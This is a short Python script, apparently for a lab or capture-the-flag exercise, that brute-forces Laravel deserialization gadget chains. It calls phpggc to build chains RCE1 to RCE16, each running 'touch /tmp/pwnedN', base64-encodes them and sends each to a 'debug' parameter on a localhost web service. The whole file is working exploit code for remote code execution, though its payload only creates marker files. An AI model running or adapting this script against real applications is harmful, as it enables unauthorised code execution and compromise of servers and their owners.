import subprocess
import requests
import base64

for i in range(1, 17):
    try:
        chain = subprocess.check_output(['php', '/home/paml/tools/phpggc/phpggc', f'Laravel/RCE{i}', 'system', f'touch /tmp/pwned{i}']).decode().strip()
        chain = base64.b64encode(chain.encode())
        resp = requests.get('http://localhost:2808/', params = {'debug': chain.decode()})
    except:
        print(i)
        pass